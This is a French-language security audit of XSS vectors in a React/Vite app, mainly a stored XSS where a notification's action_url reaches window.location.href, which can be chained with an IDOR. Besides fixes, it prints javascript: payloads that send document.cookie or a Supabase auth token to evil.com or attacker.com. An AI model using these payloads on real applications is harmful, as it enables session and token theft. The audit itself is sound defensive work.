# Analyse XSS — Unilien

**Focus** : Vecteurs d’injection côté client, React / Vite SPA

---

## Synthèse des vecteurs XSS

| # | Vecteur | Type | Sévérité | Contexte d'exécution |
|---|---------|------|----------|----------------------|
| 1 | `action_url` → `window.location.href` (push) | Stored | **Élevé** | Contexte page, foreground |
| 2 | `action_url` → `openWindow` / `navigate` (SW) | Stored | Moyen | Service Worker |
| 3 | NavIcon `dangerouslySetInnerHTML` | — | Faible (contrôlé) | Données statiques |
| 4 | `notification.title` non sanitisé | Stored | Faible | React échappe par défaut |
| 5 | `attachment.name` / `file.name` | Reflected | Faible | React échappe |

---

## 1. [ÉLEVÉ] XSS via `action_url` dans les notifications push

### Description

Le champ `action_url` des notifications est propagé jusqu’au gestionnaire de clic des push notifications sans validation. Lors d’un clic, l’URL peut être assignée à `window.location.href` et exécuter un URI `javascript:`.

### Type

**Stored XSS** : la valeur malveillante est enregistrée en base puis envoyée dans la push.

### Flux de données

```
create_notification (IDOR) / INSERT notifications (IDOR)
  → p_action_url / action_url stocké en base
  → send-push-notification lit action_url
  → payload.data.url = notification.action_url
  → pushService.onclick: window.location.href = payload.data.url
  → exécution si url = "javascript:..."
```

### Fichiers concernés

- `src/services/pushService.ts` L382-385
- `public/sw-push.js` L89-118
- `supabase/functions/send-push-notification/index.ts` L137

### Exemples de payloads

```javascript
// Vol de cookie (si cookies non HttpOnly)
javascript:fetch('https://evil.com/?c='+document.cookie)

// Vol de token Supabase (stocké en mémoire, selon implémentation)
javascript:fetch('https://evil.com/?t='+encodeURIComponent(localStorage.getItem('sb-xxx-auth-token')))

// Polyglot (essai de bypass)
javascript:alert(1)// 
javascript:alert`1`
```

### Contexte d’exécution

- **In-app (foreground)** : `showLocalNotification` → `window.location.href = payload.data.url` → exécution.
- **Background** : le SW utilise `client.navigate(targetUrl)` ou `openWindow(targetUrl)`. Les navigateurs bloquent souvent `javascript:` dans `openWindow` ; le comportement exact dépend du navigateur.

### Prérequis

- Compte authentifié (IDOR sur `create_notification` ou INSERT `notifications`).
- Victime avec push activées ou app ouverte.

### Scénario d’exploitation

1. Créer une notification pour la victime avec `action_url = "javascript:fetch('https://attacker.com/?c='+document.cookie)"`.
2. La victime reçoit la push.
3. La victime clique.
4. Si l’app est au premier plan → `window.location.href` → exécution du script.

### Impact

- Vol de cookies non HttpOnly.
- Vol de tokens (selon stockage).
- Lecture de données de la page.
- Actions sous l’identité de l’utilisateur.

### Correction

```typescript
// pushService.ts
function isSafeInternalUrl(url: string): boolean {
  try {
    const u = new URL(url, window.location.origin)
    return u.origin === window.location.origin && u.pathname.startsWith('/')
  } catch {
    return false
  }
}

if (payload.data?.url && isSafeInternalUrl(payload.data.url)) {
  window.location.href = payload.data.url
}
```

Et valider `action_url` à la source (RPC / Edge Function) : n’accepter que des chemins relatifs (ex. `/planning?date=...`).

---

## 2. [MOYEN] Service Worker — `openWindow` / `client.navigate`

### Description

Le SW utilise `data.url` (ou `data.actionUrl`) pour `client.navigate()` et `openWindow()`, sans validation.

### Fichier

`public/sw-push.js` L89-118

### Risque

- `openWindow("javascript:...")` : en général bloqué par les navigateurs modernes.
- `client.navigate("javascript:...")` : comportement variable selon l’API `Client`.

### Correction

Valider l’URL côté SW avant utilisation :

```javascript
function isSafeUrl(url) {
  try {
    const u = new URL(url, self.location.origin)
    return u.origin === self.location.origin && u.pathname.startsWith('/')
  } catch { return false }
}
if (!isSafeUrl(targetUrl)) targetUrl = '/'
```

---

## 3. [FAIBLE] NavIcon — `dangerouslySetInnerHTML`

### Description

```tsx
// src/components/ui/NavIcon.tsx L46
dangerouslySetInnerHTML={{ __html: pathData }}
```

`pathData` vient de `PATHS[name]`, un objet statique. `name` est fourni par l’app (sidebar, etc.), pas par l’utilisateur.

### Risque

- Si un parent passait un `name` contrôlé par l’utilisateur et qu’un exploit (ex. prototype pollution) modifiait `PATHS`, une injection serait possible.
- Les valeurs actuelles de `PATHS` ne contiennent que des chemins SVG (path, rect, line, etc.), pas de script.

### Correction préventive

- Vérifier que `name` provient toujours de sources de confiance.
- Whitelist des clés autorisées : `if (!VALID_ICONS.includes(name)) return null`.

---

## 4. [FAIBLE] `notification.title` non sanitisé

### Description

```tsx
// NotificationsPanel.tsx L161
{notification.title}
```

`title` n’est pas passé dans `sanitizeText()`, contrairement à `message`.

### Risque

- React échappe le contenu des expressions `{...}` dans le DOM, donc pas d’exécution de script.
- En revanche, si ce texte était un jour rendu via `dangerouslySetInnerHTML`, une injection serait possible.

### Correction (défense en profondeur)

```tsx
{sanitizeText(notification.title)}
```

---

## 5. [FAIBLE] `attachment.name` / `file.name`

### Description

`attachment.name` et `file.name` sont affichés dans `MessageBubble`, `MessageInput`, etc.

### Fichiers

- `MessageBubble.tsx` L219 (alt), L258 (contenu)
- `MessageInput.tsx` L321 (contenu)

### Risque

- React encode ces valeurs dans le DOM, donc pas d’exécution directe de HTML/JS.
- Risque faible, mais à surveiller si l’affichage change (ex. `dangerouslySetInnerHTML`).

### Correction préventive

- Appliquer `sanitizeText(attachment.name)` avant affichage.
- Limiter la longueur et les caractères autorisés côté upload.

---

## Vecteurs sans XSS identifié

| Vecteur | Statut |
|---------|--------|
| Liaison messages | `content` sanitisé via `sanitizeText()` |
| Logbook entries | Sanitisé |
| Notification message | Sanitisé |
| Paramètres URL (date, action) | Parsés, pas affichés tels quels |
| ErrorBoundary | React échappe ; en DEV uniquement |
| Données depuis localStorage | Utilisées pour l’état, pas rendues en HTML brut |

---

## Chaînage IDOR + XSS

1. **IDOR notifications** → création d’une notification avec `action_url = "javascript:..."` pour une victime.
2. **Push activée** → la victime reçoit la notification.
3. **Clic** → exécution du script dans le contexte de la victime.

Impact : vol de session, token, cookies, etc.

---

## Recommandations globales

1. Valider tout `action_url` côté backend (RPC / Edge Function).
2. N’accepter que des chemins relatifs same-origin pour les redirections post-clic.
3. Valider à nouveau côté client (`pushService`, SW) avant utilisation.
4. Utiliser `sanitizeText()` pour tous les champs utilisateur affichés, y compris `notification.title`.
5. Éviter toute nouvelle utilisation de `dangerouslySetInnerHTML` avec des données non fiables.

---

## Références

- `docs/SECURITY_PENTEST_REPORT.md`
- `docs/SECURITY_IDOR_ANALYSIS.md` (IDOR notifications)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
